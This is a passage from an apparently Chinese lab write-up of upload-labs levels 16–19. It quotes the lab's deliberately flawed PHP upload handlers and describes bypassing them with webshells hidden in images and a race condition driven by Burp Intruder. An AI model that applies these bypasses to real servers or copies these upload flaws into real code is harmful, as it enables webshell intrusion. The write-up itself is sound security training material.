class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码中要求开启php_exlf</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954919.png"></p><p>接下来同pass15</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954934.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954088.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954813.png"></p><h3 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17_二次渲染"></a>Pass-17_二次渲染</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$filetype</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$tmpname</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-variable">$target_path</span>=UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>);<br><br>    <span class="hljs-comment">// 获得上传文件的扩展名</span><br>    <span class="hljs-variable">$fileext</span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//判断文件后缀与类型，合法才进行上传操作</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是jpg格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是png格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>二次渲染是将原来的图片内容转换为另一种内容，这些内容有相同之处也有不同之处，所以我们在相同之处加入一句话木马即可</p><p>首先随便上传一张图片并找到，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954160.png"></p><p>使用010比较俩个文件</p><p>插入一句话木马</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954269.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954569.png"></p><h3 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18_条件竞争"></a>Pass-18_条件竞争</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个代码中先上传后检查，于是我们可以利用上传到删除之间的时间去访问我们上传的文件，这就是条件竞争（满足特定环境条件）。</p><p>更改一下php文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954241.png"></p><p>发送PHP代码，并且用BP抓包<br>直接发送到Intruder模块进行暴力重发</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954810.png"></p><p>发送过来后直接点击右侧清除（clean），然后点击上方的Payloads,按照如下设置</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954989.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955333.png"></p><p>接下来开始攻击，用另一个浏览器访问生成文件地址</p><h3 id="Pass-19-条件竞争-图片马"><a href="#Pass-19-条件竞争-图片马" class="headerlink" title="Pass-19-条件竞争+图片马"></a>Pass-19-条件竞争+图片马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    <span class="hljs-variable">$imgFileName</span> =<span class="hljs-title function_ invoke__">time</span>();<br>    <span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyUpload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],<span class="hljs-variable">$imgFileName</span>);<br>    <span class="hljs-variable">$status_code</span> = <span class="hljs-variable">$u</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$status_code</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$u</span>-&gt;cls_upload_dir . <span class="hljs-variable">$u</span>-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传目录不可写。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">3</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">4</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传的文件过大。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">5</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;未知错误！&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br>......<br>......<br>...... <br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_arr_ext_accepted</span> = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br><br>......<br>......<br>......  <br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;<br>    <br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isUploadedFile</span>();<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setDir</span>( <span class="hljs-variable">$dir</span> );<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkExtension</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSize</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkFileExists</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">renameFile</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>......<br>......<br>...... <br>&#125;;<br></code></pre></td></tr></table></figure><p>19关与18关相比，加入了图片马</p><p>在图片末尾加入木马</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955594.png"></p><p>上传图片并用bp抓包</p><p><img 